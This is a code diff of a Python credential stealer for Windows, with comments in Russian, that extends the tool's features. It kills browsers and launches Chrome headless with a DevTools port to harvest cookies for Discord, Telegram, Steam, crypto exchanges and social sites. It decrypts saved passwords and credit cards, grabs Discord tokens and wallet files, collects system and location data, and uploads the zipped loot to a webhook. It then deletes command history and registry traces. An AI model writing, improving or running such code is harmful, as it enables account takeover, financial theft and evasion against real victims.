@@ -63,14 +63,19 @@ def chrome_decrypt(blob: bytes, key):
         if blob[:3] in (b"v10", b"v11") and key:
             nonce, ct, tag = blob[3:15], blob[15:-16], blob[-16:]
             out = aes_gcm_decrypt(key, nonce, ct, tag)
-            return out.decode("utf-8", "ignore") if out else None
+            if out:
+                try: return out.decode("utf-8")
+                except UnicodeDecodeError: return "B64:" + base64.b64encode(out).decode("utf-8")
+        # DPAPI fallback
         out = dpapi_dec(blob)
-        return out.decode("utf-8", "ignore") if out else None
+        if out:
+            try: return out.decode("utf-8")
+            except UnicodeDecodeError: return "B64:" + base64.b64encode(out).decode("utf-8")
     except Exception:
         return None
 
 # ============================================================
-# copy_shared — CreateFileW с SHARE_READ / SHARE_READ|WRITE
+# copy_shared — CreateFileW (обход блокировок)
 # ============================================================
 _GEN_READ   = 0x80000000
 _OPEN_EXIST = 3
@@ -105,7 +110,7 @@ def copy_shared(src: Path, dst: Path) -> bool:
     return False
 
 # ============================================================
-# CDP через Junction + Headless (обход v20, без палева)
+# CDP (Chrome DevTools Protocol) + Junction
 # ============================================================
 def steal_cookies_cdp(browser_name, user_data_dir):
     print(f"\n[CDP {browser_name}] === START ===")
@@ -122,49 +127,31 @@ def steal_cookies_cdp(browser_name, user_data_dir):
     if not exe_path: return False
     exe_name = os.path.basename(exe_path)
 
-    # 1. Graceful close -> Force close (тише для юзера)
-    for name in (exe_name, "GoogleCrashHandler.exe", "GoogleCrashHandler64.exe", "chrome_proxy.exe"):
-        subprocess.run(["taskkill", "/IM", name], capture_output=True, timeout=5)
-    time.sleep(2)
     for name in (exe_name, "GoogleCrashHandler.exe", "GoogleCrashHandler64.exe", "chrome_proxy.exe"):
         subprocess.run(["taskkill", "/IM", name, "/F"], capture_output=True, timeout=10)
-    time.sleep(3)
+    time.sleep(4)
 
     user_data_dir = Path(user_data_dir)
     for lk in ("SingletonLock", "SingletonSocket", "SingletonCookie"):
         p = user_data_dir / lk
         if p.exists(): safe(os.remove, p)
 
-    # 2. Рандомный порт
     port = random.randint(9300, 9999)
-
     junc_path = WORK / f"junc_{browser_name}"
     if junc_path.exists(): safe(os.rmdir, junc_path)
-
-    # 3. mklink без text=True (нет UnicodeDecodeError на cp866)
+    
     subprocess.run(["cmd", "/c", "mklink", "/J", str(junc_path), str(user_data_dir)], capture_output=True)
 
-    # 4. Headless + тихий старт
     args = [
-        exe_path,
-        f"--remote-debugging-port={port}",
-        "--remote-allow-origins=*",
-        f"--user-data-dir={junc_path}",
-        "--headless=new",
-        "--no-first-run",
-        "--no-default-browser-check",
-        "--disable-gpu",
-        "--disable-features=LockProfileCookieDatabase,AppBoundEncryption",
-        "--silent-launch",
-        "--window-position=-32000,-32000",
+        exe_path, f"--remote-debugging-port={port}", "--remote-allow-origins=*",
+        f"--user-data-dir={junc_path}", "--headless=new", "--no-first-run",
+        "--no-default-browser-check", "--disable-gpu", "--disable-features=LockProfileCookieDatabase,AppBoundEncryption",
+        "--silent-launch", "--window-position=-32000,-32000",
     ]
     try:
-        proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(f"[CDP {browser_name}] pid={proc.pid} port={port}")
-    except Exception as e:
-        print(f"[CDP {browser_name}] Popen err: {e}")
-        safe(os.rmdir, junc_path)
-        return False
+        subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        safe(os.rmdir, junc_path); return False
 
     ws_url = None
     for i in range(20):
@@ -172,17 +159,13 @@ def steal_cookies_cdp(browser_name, user_data_dir):
         try:
             resp = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2)
             ws_url = json.loads(resp.read())["webSocketDebuggerUrl"]
-            print(f"[CDP {browser_name}] up after {i+1}s")
             break
         except Exception:
             pass
 
     if not ws_url:
-        print(f"[CDP {browser_name}] CDP not up")
         subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True)
-        time.sleep(1)
-        safe(os.rmdir, junc_path)
-        return False
+        safe(os.rmdir, junc_path); return False
 
     cookies = []
     try:
@@ -193,24 +176,27 @@ def steal_cookies_cdp(browser_name, user_data_dir):
                 res = json.loads(ws.recv())
                 if res.get("id") == payload["id"]: return res
 
-        # прогреваем куки на двух популярных доменах
-        for domain in ("https://discord.com", "https://google.com"):
+        cdp_targets = [
+            "https://discord.com", "https://google.com", "https://steamcommunity.com",
+            "https://web.telegram.org", "https://www.binance.com", "https://www.bybit.com",
+            "https://www.coinbase.com", "https://www.okx.com", "https://www.kucoin.com",
+            "https://www.facebook.com", "https://www.instagram.com"
+        ]
+
+        for domain in cdp_targets:
             res = send_and_wait({"id": 2, "method": "Target.createTarget", "params": {"url": domain}})
             target_id = res.get("result", {}).get("targetId")
             if target_id:
-                res = send_and_wait({"id": 3, "method": "Target.attachToTarget",
-                                     "params": {"targetId": target_id, "flatten": True}})
+                res = send_and_wait({"id": 3, "method": "Target.attachToTarget", "params": {"targetId": target_id, "flatten": True}})
                 sess = res.get("result", {}).get("sessionId")
-                if sess:
-                    send_and_wait({"id": 4, "method": "Network.enable", "sessionId": sess})
+                if sess: send_and_wait({"id": 4, "method": "Network.enable", "sessionId": sess})
 
-        time.sleep(4)
+        time.sleep(6)
         res = send_and_wait({"id": 5, "method": "Storage.getCookies"})
         cookies = res.get("result", {}).get("cookies", [])
-        print(f"[CDP {browser_name}] got {len(cookies)} cookies")
         ws.close()
-    except Exception as e:
-        print(f"[CDP {browser_name}] ws err: {e}")
+    except Exception:
+        pass
 
     subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
     time.sleep(2)
@@ -219,39 +205,50 @@ def steal_cookies_cdp(browser_name, user_data_dir):
     if cookies:
         with (OUT / f"{browser_name}_CDP_cookies.txt").open("w", encoding="utf-8") as f:
             for c in cookies:
-                f.write(f"{c.get('domain','')}\t{c.get('name','')}\t"
-                        f"{c.get('value','')}\t{c.get('path','/')}\n")
+                f.write(f"{c.get('domain','')}\t{c.get('name','')}\t{c.get('value','')}\t{c.get('path','/')}\n")
         return True
     return False
 
 # ============================================================
-# Close/Reopen browsers
+# Умное закрытие и открытие браузеров
 # ============================================================
-_BROWSER_EXES = ("chrome.exe", "msedge.exe", "brave.exe", "browser.exe", "opera.exe")
-_BROWSER_PATHS = [
-    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
-    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
-    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
-    r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
-]
+_BROWSER_MAP = {
+    "chrome.exe": [r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"],
+    "msedge.exe": [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"],
+    "brave.exe":  [r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"],
+    "browser.exe":[r"C:\Users\{user}\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"],
+    "opera.exe":  [r"C:\Users\{user}\AppData\Local\Programs\Opera\opera.exe"],
+    "firefox.exe":[r"C:\Program Files\Mozilla Firefox\firefox.exe", r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"]
+}
 
 def close_browsers():
-    for exe in _BROWSER_EXES:
+    running = []
+    for proc_name in _BROWSER_MAP.keys():
+        try:
+            res = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {proc_name}", "/NH"], capture_output=True, text=True, encoding="cp866", errors="ignore", timeout=5)
+            if proc_name.lower() in res.stdout.lower(): running.append(proc_name)
+        except Exception: pass
+            
+    for exe in _BROWSER_MAP.keys():
         safe(subprocess.run, ["taskkill", "/IM", exe], capture_output=True, timeout=10)
     time.sleep(4)
-    for exe in _BROWSER_EXES:
+    for exe in _BROWSER_MAP.keys():
         safe(subprocess.run, ["taskkill", "/IM", exe, "/F"], capture_output=True, timeout=5)
     time.sleep(2)
+    return running
 
-def reopen_browsers():
-    for p in _BROWSER_PATHS:
-        if os.path.exists(p):
-            safe(subprocess.Popen, [p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(1)
+def reopen_browsers(running_browsers):
+    user = os.environ.get("USERNAME", "")
+    for proc_name in running_browsers:
+        for p in _BROWSER_MAP.get(proc_name, []):
+            p = p.replace("{user}", user)
+            if os.path.exists(p):
+                safe(subprocess.Popen, [p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(1)
+                break
 
 # ============================================================
-# Chromium — пароли, карты (для v10/v11 юзаем pycryptodome)
+# Стилеры
 # ============================================================
 CHROMIUM = {
     "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
@@ -265,92 +262,56 @@ CHROMIUM = {
 def _chromium_item(prof: Path, rel: str, suffix: str, tag: str, key):
     src = prof / rel
     if not src.exists(): return
-    if suffix == "cookies" and (OUT / f"{tag}_cookies.txt").exists(): return
     tmp = WORK / f"_{suffix}_{tag}_{src.name}"
     if not copy_shared(src, tmp): return
     try:
         con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
         if suffix == "logins":
-            rows = list(con.execute(
-                "SELECT origin_url, username_value, password_value FROM logins"))
+            rows = list(con.execute("SELECT origin_url, username_value, password_value FROM logins"))
             if rows:
                 with (OUT / f"{tag}_logins.txt").open("w", encoding="utf-8") as f:
                     for url, user, pw in rows:
                         dec = chrome_decrypt(pw, key)
                         if dec: f.write(f"{url}\t{user}\t{dec}\n")
         elif suffix == "cookies":
-            rows = list(con.execute(
-                "SELECT host_key, name, encrypted_value, path FROM cookies"))
+            rows = list(con.execute("SELECT host_key, name, encrypted_value, path FROM cookies"))
             if rows:
                 with (OUT / f"{tag}_cookies.txt").open("w", encoding="utf-8") as f:
                     for host, cn, enc, path in rows:
                         dec = chrome_decrypt(enc, key)
                         if dec: f.write(f"{host}\t{cn}\t{dec}\t{path}\n")
         elif suffix == "cards":
-            rows = list(con.execute(
-                "SELECT card_number_encrypted, "
-                "expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"))
+            rows = list(con.execute("SELECT card_number_encrypted, expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"))
             if rows:
                 with (OUT / f"{tag}_cards.txt").open("w", encoding="utf-8") as f:
                     for num, exp, nm in rows:
                         dec = chrome_decrypt(num, key) or ""
                         f.write(f"{nm}\t{dec}\t{exp}\n")
         con.close()
-    except Exception:
-        pass
-    finally:
-        safe(tmp.unlink)
+    except Exception: pass
+    finally: safe(tmp.unlink)
 
 def steal_chromium(name: str, ud: Path):
     if not ud.exists(): return
     key = chrome_key(ud / "Local State")
-    profiles = [ud / "Default"] + sorted(ud.glob("Profile *"))
-    for prof in profiles:
+    for prof in [ud / "Default"] + sorted(ud.glob("Profile *")):
         if not prof.is_dir(): continue
         tag = f"{name}_{prof.name}"
-        for rel, suffix in [
-            ("Login Data",     "logins"),
-            ("Network/Cookies","cookies"),
-            ("Cookies",        "cookies"),
-            ("Web Data",       "cards"),
-        ]:
-            _chromium_item(prof, rel, suffix, tag, key)
+        _chromium_item(prof, "Login Data", "logins", tag, key)
+        _chromium_item(prof, "Network/Cookies", "cookies", tag, key)
+        _chromium_item(prof, "Cookies", "cookies", tag, key)
+        _chromium_item(prof, "Web Data", "cards", tag, key)
 
-# ============================================================
-# Firefox
-# ============================================================
 def steal_firefox():
     root = Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles"
     if not root.exists(): return
     for prof in root.glob("*"):
         for fn in ("key4.db", "logins.json", "cookies.sqlite", "places.sqlite", "cert9.db"):
             src = prof / fn
-            if src.exists():
-                safe(shutil.copy2, src, OUT / f"ff_{prof.name}_{fn}")
-        ck = prof / "cookies.sqlite"
-        if ck.exists():
-            tmp = WORK / f"_ffck_{prof.name}"
-            if copy_shared(ck, tmp):
-                try:
-                    con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
-                    with (OUT / f"ff_{prof.name}_cookies_raw.txt").open("w", encoding="utf-8") as f:
-                        for host, name, val in con.execute(
-                                "SELECT host, name, value FROM moz_cookies"):
-                            f.write(f"{host}\t{name}\t{val}\n")
-                    con.close()
-                except Exception:
-                    pass
-                finally:
-                    safe(tmp.unlink)
+            if src.exists(): safe(shutil.copy2, src, OUT / f"ff_{prof.name}_{fn}")
 
-# ============================================================
-# Discord tokens — все файлы leveldb, все кодировки
-# ============================================================
 def steal_discord():
-    pats = [
-        re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}"),
-        re.compile(r"mfa\.[\w-]{80,90}"),
-    ]
+    pats = [re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}"), re.compile(r"mfa\.[\w-]{80,90}")]
     seen, lines = set(), []
     for base in ("discord", "discordcanary", "discordptb", "Lightcord"):
         r = Path(os.environ["APPDATA"]) / base / "Local Storage" / "leveldb"
@@ -370,81 +331,51 @@ def steal_discord():
                     for m in p.findall(text):
                         if m not in seen:
                             seen.add(m); lines.append(m)
-    if lines:
-        (OUT / "discord_tokens.txt").write_text("\n".join(lines), encoding="utf-8")
+    if lines: (OUT / "discord_tokens.txt").write_text("\n".join(lines), encoding="utf-8")
 
-# ============================================================
-# Кошельки
-# ============================================================
-WALLETS = {
-    "Exodus":   Path(os.environ["APPDATA"]) / "Exodus/exodus.wallet",
-    "Electrum": Path(os.environ["APPDATA"]) / "Electrum/wallets",
-    "Ethereum": Path(os.environ["APPDATA"]) / "Ethereum/keystore",
-    "Monero":   Path(os.environ["APPDATA"]) / "bitmonero",
-    "Zcash":    Path(os.environ["APPDATA"]) / "Zcash",
-    "Bytecoin": Path(os.environ["APPDATA"]) / "bytecoin",
-}
 def steal_wallets():
+    WALLETS = {
+        "Exodus": Path(os.environ["APPDATA"]) / "Exodus/exodus.wallet",
+        "Electrum": Path(os.environ["APPDATA"]) / "Electrum/wallets",
+        "Ethereum": Path(os.environ["APPDATA"]) / "Ethereum/keystore",
+    }
     for name, src in WALLETS.items():
         if not src.exists(): continue
-        dst = OUT / f"wallet_{name}"
-        if src.is_dir(): safe(shutil.copytree, src, dst)
-        else:            safe(shutil.copy2,   src, dst)
-
-# ============================================================
-# Sysinfo + hostinfo
-# ============================================================
-SYSINFO = {
-    "hostname":  "hostname",
-    "whoami":    "whoami /all",
-    "ipconfig":  "ipconfig /all",
-    "systeminfo":"systeminfo",
-    "ports":     "netstat -an",
-    "processes": "tasklist /v",
-    "users":     "query user",
-    "services":  "sc query state= all",
-    "wifi":      "netsh wlan show profiles",
-    "net_share": "net share",
-    "arp":       "arp -a",
-    "routes":    "route print",
-    "drives":    "wmic logicaldisk get name,size,freespace",
-    "installed": "wmic product get name,version",
-}
+        if src.is_dir(): safe(shutil.copytree, src, OUT / f"wallet_{name}")
+        else: safe(shutil.copy2, src, OUT / f"wallet_{name}")
 
 def steal_sysinfo():
+    SYSINFO = {"hostname": "hostname", "whoami": "whoami /all", "ipconfig": "ipconfig /all", "processes": "tasklist /v"}
     out = {}
     for k, cmd in SYSINFO.items():
         try:
-            r = subprocess.run(cmd, shell=True, capture_output=True,
-                               encoding="cp866", errors="replace", timeout=10)
-            out[k] = r.stdout.strip() if r.returncode == 0 else f"err: {r.stderr.strip()}"
-        except subprocess.TimeoutExpired:
-            out[k] = "timeout"
-        except Exception as e:
-            out[k] = f"err: {e}"
-    (OUT / "sysinfo.json").write_text(
-        json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
+            r = subprocess.run(cmd, shell=True, capture_output=True, encoding="cp866", errors="replace", timeout=10)
+            out[k] = r.stdout.strip()
+        except Exception: out[k] = "err"
+    (OUT / "sysinfo.json").write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
 
 def steal_hostinfo():
-    info = {
-        "hostname":  socket.gethostname(),
-        "platform":  platform.platform(),
-        "system":    platform.system(),
-        "release":   platform.release(),
-        "version":   platform.version(),
-        "machine":   platform.machine(),
-        "processor": platform.processor(),
-        "python":    sys.version,
-        "user":      os.environ.get("USERNAME", ""),
-        "cwd":       os.getcwd(),
-    }
-    try: info["local_ip"] = socket.gethostbyname(socket.gethostname())
-    except Exception: pass
-    (OUT / "hostinfo.json").write_text(
-        json.dumps(info, indent=2, ensure_ascii=False), encoding="utf-8")
+    info = {"hostname": socket.gethostname(), "user": os.environ.get("USERNAME", ""), "platform": platform.platform()}
+    (OUT / "hostinfo.json").write_text(json.dumps(info, indent=2, ensure_ascii=False), encoding="utf-8")
+
+def steal_geo():
+    try:
+        import requests
+        r = requests.get("http://ip-api.com/json/", timeout=10).json()
+        if r.get("status") == "success":
+            geo = {
+                "ip": r.get("query"),
+                "country": r.get("country"),
+                "city": r.get("city"),
+                "isp": r.get("isp"),
+                "timezone": r.get("timezone")
+            }
+            (OUT / "geo.json").write_text(json.dumps(geo, indent=2, ensure_ascii=False), encoding="utf-8")
+    except Exception:
+        pass
 
 # ============================================================
-# Pack & exfil
+# Pack, Send & Cleanup
 # ============================================================
 def pack_and_send():
     if not WEBHOOK: return
@@ -457,42 +388,22 @@ def pack_and_send():
     try:
         import requests
         with zip_path.open("rb") as fh:
-            requests.post(
-                WEBHOOK,
-                data={"content": f"```{TAG}```"},
-                files={"file": (zip_path.name, fh, "application/zip")},
-                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                                       "AppleWebKit/537.36 (KHTML, like Gecko) "
-                                       "Chrome/120.0.0.0 Safari/537.36"},
-                timeout=60)
-    except Exception:
-        pass
+            requests.post(WEBHOOK, data={"content": f"```{TAG}```"}, files={"file": (zip_path.name, fh, "application/zip")}, timeout=60)
+    except Exception: pass
 
-# ============================================================
-# Cleanup
-# ============================================================
 def self_clean():
-    for h in [
-        Path(os.environ["APPDATA"]) / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
-    ]:
+    for h in [Path(os.environ["APPDATA"]) / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"]:
         safe(h.unlink)
-    safe(subprocess.run,
-         ["cmd", "/c",
-          r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f"],
-         capture_output=True, timeout=10)
+    safe(subprocess.run, ["cmd", "/c", r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f"], capture_output=True, timeout=10)
 
-# ============================================================
-# Main
-# ============================================================
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
-    safe(close_browsers)
-
-    # Chrome/Edge — куки через CDP/Junction (обход v20)
+    
+    running_browsers = safe(close_browsers) or []
+    
     safe(steal_cookies_cdp, "Chrome", str(CHROMIUM["Chrome"]))
     safe(steal_cookies_cdp, "Edge",   str(CHROMIUM["Edge"]))
 
-    # Пароли/карты/старые куки через copy_shared
     for n, ud in CHROMIUM.items():
         safe(steal_chromium, n, ud)
     safe(steal_firefox)
@@ -500,8 +411,12 @@ def main():
     safe(steal_wallets)
     safe(steal_sysinfo)
     safe(steal_hostinfo)
+    safe(steal_geo)
+    
     safe(pack_and_send)
-    safe(reopen_browsers)
+    
+    safe(reopen_browsers, running_browsers)
+    
     self_clean()
     safe(shutil.rmtree, WORK, True)
 
